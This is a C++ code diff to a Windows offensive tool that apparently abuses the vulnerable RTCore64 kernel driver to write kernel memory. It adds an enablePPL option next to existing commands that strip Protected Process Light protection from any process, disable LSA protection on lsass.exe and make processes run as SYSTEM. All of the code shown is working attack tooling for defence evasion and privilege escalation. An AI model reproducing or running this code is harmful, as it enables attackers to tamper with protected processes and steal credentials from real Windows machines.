@@ -291,7 +291,7 @@ struct Offsets {
     DWORD64 SignatureLevelOffset;
 };
 
-void disableProtectedProcesses(DWORD targetPID, Offsets offsets) {
+void modifyProtectedProcesses(DWORD targetPID, Offsets offsets, BOOL enableProtection) {
     const auto Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
     if (Device == INVALID_HANDLE_VALUE) {
         Log("[!] Unable to obtain a handle to the device object");
@@ -324,9 +324,15 @@ void disableProtectedProcesses(DWORD targetPID, Offsets offsets) {
     } while (CurrentProcessAddress != ProcessHead);
     CurrentProcessAddress -= offsets.ActiveProcessLinksOffset;
     Log("[*] Current process address: %p", CurrentProcessAddress);
-
-    // Patches 5 values  SignatureLevel, SectionSignatureLevel, Type, Audit, and Signer
-    WriteMemoryPrimitive(Device, 4, CurrentProcessAddress + offsets.SignatureLevelOffset, 0x00);
+    if (enableProtection) {
+        Log("[*] Enabling PPL protection for process.");
+        WriteMemoryDWORD64(Device, CurrentProcessAddress + offsets.SignatureLevelOffset, (DWORD64)0x58c00000623f3f);
+    }
+    else {
+        Log("[*] Disabling PPL protection for process.");
+        // Patches 5 values SignatureLevel, SectionSignatureLevel, Type, Audit, and Signer
+        WriteMemoryPrimitive(Device, 4, CurrentProcessAddress + offsets.SignatureLevelOffset, 0x00);
+    }
 
     // Cleanup
     CloseHandle(Device);
@@ -552,6 +558,7 @@ int wmain(int argc, wchar_t* argv[]) {
     if (argc < 2) {
         wprintf(L"Usage: %s\n"
             " [/disablePPL <PID>]\n"
+            " [/enablePPL <PID>]\n"
             " [/disableLSAProtection]\n"
             " [/makeSYSTEM <PID>]\n"
             " [/makeSYSTEMcmd]\n"
@@ -566,12 +573,17 @@ int wmain(int argc, wchar_t* argv[]) {
     if (wcscmp(argv[1] + 1, L"disablePPL") == 0 && argc == 3) {
         Offsets offsets = getVersionOffsets();
         auto PID = _wtoi(argv[2]);
-        disableProtectedProcesses(PID, offsets);
+        modifyProtectedProcesses(PID, offsets, false);
+    }
+    else if (wcscmp(argv[1] + 1, L"enablePPL") == 0 && argc == 3) {
+        Offsets offsets = getVersionOffsets();
+        auto PID = _wtoi(argv[2]);
+        modifyProtectedProcesses(PID, offsets, true);
     }
     else if (wcscmp(argv[1] + 1, L"disableLSAProtection") == 0) {
         Offsets offsets = getVersionOffsets();
         auto lsassPID = processPIDByName(L"lsass.exe");
-        disableProtectedProcesses(lsassPID, offsets);
+        modifyProtectedProcesses(lsassPID, offsets, false);
     }
     else if (wcscmp(argv[1] + 1, L"makeSYSTEM") == 0 && argc == 3) {
         Offsets offsets = getVersionOffsets();
